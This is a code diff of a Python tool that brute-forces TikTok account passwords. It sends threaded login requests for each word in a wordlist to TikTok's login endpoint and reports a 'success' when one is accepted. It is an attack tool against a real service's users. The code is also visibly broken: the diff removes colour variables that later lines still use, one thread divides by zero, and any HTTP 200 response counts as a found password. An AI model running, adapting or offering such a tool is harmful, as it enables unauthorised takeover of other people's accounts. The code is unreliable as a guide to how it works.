@@ -1,7 +1,7 @@
 import requests
-from colorama import Fore, Style, init
-import threading
 from subprocess import call
+from colorama import Fore, Style, Back, init
+import threading
 
 init()
 
@@ -53,56 +53,90 @@ print()
 print()
 print()
 
-init()
+print(blue + " > DO NOT ADD THE '@'")
+user = input(yellow + " > user: " + reset)
 
-red = Fore.LIGHTRED_EX
-blue = Fore.LIGHTBLUE_EX
-reset = Style.RESET_ALL
-green = Fore.LIGHTGREEN_EX
-yellow = Fore.YELLOW
-magenta = Fore.LIGHTMAGENTA_EX
+print()
 
-adv = yellow + "[+]" + magenta
+print(blue, "> IT MUST BE IN THIS DIRECTORY OR USE THE DEFAULT 'wordlist.txt'")
+wordlist = input(yellow + " > wordlist: " + reset)
 
-def brute_force_worker(user, session, wordlist, start_point, index, chunk_size=10):
+print()
+
+print(blue, "> WHAT NUMBER SHOULD THE WORDLIST START AT?")
+start_point = input(blue + " > Enter the starting point in the wordlist (e.g., 0 for the beginning): " + reset)
+
+try:
+    start_point = int(start_point)
+except ValueError:
+    print(red + "Invalid input. Defaulting to the beginning of the wordlist." + reset)
+    start_point = 0
+
+i = input(yellow + " > #: " + reset)
+password = None
+
+def brute_force_worker(user, wordlist, start_point, index):
     global password
 
     with open(wordlist, 'r') as f:
         words = f.readlines()
 
-    for i in range(start_point, len(words), chunk_size):
-        chunk = [word.strip() for word in words[i:i+chunk_size]]
-        print(adv, f"Thread {index} cracking accounts {i + 1}-{i + chunk_size}/{len(words)}", reset)
-        try:
-            passwords = [{"username": user, "password": word} for word in chunk]
-            response = session.post('https://www.tiktok.com/node/login_v2/index', json=passwords)
-            results = response.json()
+    for i in range(start_point, len(words)):
+        if i % index == 0:  # Only process words that match the thread index
+            word = words[i].strip()
+            print(adv, f"Thread {index} cracking account...", f"{i + 1}/{len(words)}", reset)
+            try: 
+              response = requests.post('https://www.tiktok.com/node/login_v2/index', json={
+              "username": user,
+              "password": word,
+              "mix_mode": True,
+              "captcha": "",
+              "email": "",
+              "mobile": "",
+              "account": "",
+              "type": 1,
+              "app_id": 1233,
+              "device_id": "",
+              "iid": "",
+              "os_version": "",
+              "channel": "",
+              "device_platform": "",
+              "request_id": "",
+              "captcha_app": "",
+              "captcha_type": "",
+              "google_account": "",
+              "google_captcha": "",
+              "google_token": "",
+              "fb_account": "",
+              "fb_code": "",
+              "fb_token": "",
+              "apple_id": "",
+              "apple_token": "",
+              "apple_email": "",
+              "apple_code": "",
+              "mix_string": word
+              })
+              if response.status_code == 200:
+                password = word
+                print()
+                print(green + f" success! password is {word}" + reset)
+                return
+              else:
+                print()
+                print(red + f"failed! password not found in {wordlist}" + reset)
+            except Exception as e:
+                print()
+                print(red + f"Error: {e}. Pausing for user input..." + reset)
+                input("Press Enter to resume...")
 
-            for result, word in zip(results, chunk):
-                if result.get('status') == 200:
-                    password = word
-                    print()
-                    print(green + f" success! password is {word}" + reset)
-                    return
-                else:
-                    print()
-                    print(red + f" failed! password not found: {word}" + reset)
-
-        except Exception as e:
-           print()
-           print(red + f" Error: {e}. Response content: {response.content.decode('utf-8')}. Pausing for user input..." + reset)
-           input("Press Enter to resume...")
-
-
-def brute_force_parallel(user, wordlist, start_point, num_threads=4, chunk_size=10):
+def brute_force_parallel(user, wordlist, start_point, num_threads=4):
     global password
 
-    session = requests.Session()
     call(["clear"])
 
     threads = []
     for i in range(num_threads):
-        thread = threading.Thread(target=brute_force_worker, args=(user, session, wordlist, start_point, i, chunk_size))
+        thread = threading.Thread(target=brute_force_worker, args=(user, wordlist, start_point, i))
         threads.append(thread)
         thread.start()
 
@@ -114,7 +148,7 @@ user, password, wordlist, start_point = input(yellow + " > user: " + reset), Non
 try:
     start_point = int(start_point)
 except ValueError:
-    print(red + " Invalid input. Defaulting to the beginning of the wordlist." + reset)
+    print(red + "Invalid input. Defaulting to the beginning of the wordlist." + reset)
     start_point = 0
 
 brute_force_parallel(user, wordlist, start_point)
